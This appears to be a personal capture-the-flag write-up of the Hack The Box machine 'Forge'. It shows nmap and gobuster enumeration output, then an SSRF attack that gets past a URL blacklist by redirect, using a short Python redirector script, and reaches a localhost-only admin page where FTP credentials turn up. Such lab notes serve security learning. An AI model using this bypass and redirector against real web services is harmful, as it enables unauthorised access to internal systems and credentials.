
== Introduction ==

== Enumeration ==

=== Nmap ===

{{{class="nohighlight"
# Nmap 7.92 scan initiated Wed Jul 27 18:34:26 2022 as: nmap -sS -sCV -oA scans/nmap/init 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 27 18:34:35 2022 -- 1 IP address (1 host up) scanned in 9.23 seconds
}}}

- nmap does not follow redirect to http://forge.htb, add it to /etc/hosts and run gobster vhost
    - ftp is also filtered, yay

{{{class="nohighlight"
trent@kali[Forge]$ cat /etc/hosts
...
10.10.11.111    forge.htb admin.forge.htb
...
}}}

{{{class="nohighlight"
trent@kali[Forge]$ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/27 18:49:01 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]

===============================================================
2022/07/27 18:49:25 Finished
===============================================================
}}}

{{local:../images/forge/website/admin/only_localhost_allowed.png|Admin interface only available on localhost}}

{{local:../images/forge/website/homepage.png|Homepage for http://forge.htb}}

- http://forge.htb/upload can be used to upload images by file or url
- uploading by url and making it callback to a netcat listener shows the request was made by
  python-requests/2.25.1

{{local:../images/forge/website/upload_from_url.png|Upload from url}}
{{local:../images/forge/website/python_requests_callback.png|python-requests version}}

- url uploads only accept http/https

[[local:../images/forge/website/forge_htb_blacklisted_url_uploads.png|Blacklist protocols]]

- Cant make requests to http://forge.htb or http://admin.forge.htb

[[local:../images/forge/website/forge_htb_blacklisted_url_uploads.png|Blacklisted urls]]

- we can get around the blacklist by redirecting to where we actually want to go

- [ ] TODO - Write a script that does this whole ssrf thing without pain and suffering
{{{python
#!/usr/bin/env python3

# https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#bypass-via-redirect
# python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
}}}

- We cant see the site in the browser cause it tries to render the page as a jpg, but we can see the
  html in Burpsuite

{{local:../images/forge/website/admin/homepage_html_via_ssrf_redirect.png|Successful ssrf attack}}

- we have found some ftp creds, yay

{{local:../images/forge/website/admin/ftp_credentials.png|FTP credentials}}
